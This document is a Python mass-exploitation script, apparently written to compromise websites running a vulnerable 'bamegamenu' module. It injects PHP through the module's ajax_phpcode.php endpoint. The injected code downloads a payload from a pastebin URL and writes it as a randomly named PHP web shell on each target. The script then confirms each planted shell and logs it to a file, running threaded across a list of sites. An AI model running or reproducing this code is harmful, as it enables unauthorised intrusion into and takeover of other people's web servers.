import requests, re, string, random, sys, os
from time import time as timer
from multiprocessing.dummy import Pool as ThreadPool
from platform import system	
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init												
init(autoreset=True)										
import time
####### Colors	 ######	
	
fr  =   Fore.RED											
fc  =   Fore.CYAN											
fw  =   Fore.WHITE											
fg  =   Fore.GREEN											
sd  =   Style.DIM											
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT										

####################### 
# Coder By RxR HaCkEr #
#######################
try:
    with open(sys.argv[1], 'r') as f:
        woh = f.read().splitlines()
except IOError:
    pass
woh = list((woh))

def Domain(url):

	if 'http://' not in url:
		return "http://" + url
	else:
		return url
		

def Banners():

	if system() == 'Linux':
		os.system('clear')
	if system() == 'Windows':
		os.system('cls')
		
	banner = """{}{} \n \n



		
			______       ______   _   _         _____  _     _____          
			| ___ \      | ___ \ | | | |       /  __ \| |   |  ___|        
			| |_/ /__  __| |_/ / | |_| |  __ _ | /  \/| | __| |__  _ __  
			|    / \ \/ /|    /  |  _  | / _` || |    | |/ /|  __|| '__|  
			| |\ \ >  < | |\ \ | | | || (_| || \__/\|   < | |___| |    
			\_| \_|/_/\_\\_| \_| \_| |_/ \__,_| \____/|_|\_\\____/|_|      
		 
					Coded By RxR HaCkEr 
					   Skype:a.789a
						 
						 
											
		   
			

				\n""".format(fc, sb)
		
	print banner

def pwd_generator(size=8, chars=string.ascii_uppercase + string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
	
	
def bameg(site):
	
	try:
		
		url = Domain(site)

		headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
				   "Accept": "*/*",
				   "Accept-Language": "en-US,en;q=0.5",
				   "Accept-Encoding": "gzip, deflate",
				   "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
				   "X-Requested-With": "XMLHttpRequest",
				   "Connection": "close"}
		
		filename = "RxR_" + pwd_generator() + ".php"
		
		remote = """echo fwrite(fopen("../../"""+filename+"""","w+"),file_get_contents("https://pastebin.com/raw/swNVg5Hr"));"""
		
		
		inct_code = requests.get(url + "/modules/bamegamenu/ajax_phpcode.php?code=" + remote , headers=headers)
		
		check = requests.get(url + "/" + filename , headers=headers)
	

		
		if 'RxR HaCkEr' in check.content:
			print("Target: {}  {}{} Success eXploitinG ").format(url, fg, sb)
			open('bamegam_shells.txt', 'a').write(url + "/" + filename + "\n")
		else:
			print("Target: {}  {}{} Not Vuln ... ").format(url, fr, sb)
	
	except Exception as Ex:
		print(Ex)

Banners()
def Main():
    try:
        start = timer()
        pp = ThreadPool(10)
        pr = pp.map(bameg, woh)
        print('Time: ' + str(timer() - start) + ' seconds')
    except:
        pass


if __name__ == '__main__':
    Main()